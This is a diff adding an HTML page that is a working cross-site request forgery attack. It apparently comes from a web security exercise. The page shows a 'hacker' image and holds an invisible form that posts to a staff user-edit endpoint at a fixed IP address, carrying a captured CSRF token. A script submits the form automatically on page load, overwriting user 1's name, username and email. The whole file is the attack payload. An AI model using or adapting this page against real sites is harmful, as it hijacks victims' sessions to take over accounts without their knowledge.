@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <img src="./Assets/hacker.jpg" />
+    <form name="csrf" action="https://104.198.225.79/red/public/staff/users/edit.php?id=1" method="POST" style="opacity:0"> 
+      <input type="hidden" name="csrf_token" value="e1dda25c332006a73df09ec32c6b4939" />
+      <input type="text" name="first_name" value="James" />
+      <input type="text" name="last_name" value="Munroe" />
+      <input type="text" name="username" value="jmonroe99" />
+      <input type="text" name="email" value="test@test.com" />
+      <input type="submit" value="Update" />
+    </form>
+    <script>
+      document.csrf.submit();
+    </script>
+  </body>
+</html>
